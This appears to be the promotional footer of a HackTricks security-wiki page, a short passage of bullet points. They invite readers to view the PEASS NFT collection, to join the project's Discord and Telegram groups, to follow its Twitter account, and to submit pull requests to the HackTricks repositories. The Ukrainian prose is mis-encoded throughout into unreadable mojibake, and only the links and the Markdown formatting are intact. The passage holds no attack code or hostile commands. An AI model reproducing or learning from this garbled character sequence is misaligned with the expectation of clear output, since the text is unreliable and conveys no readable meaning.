* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
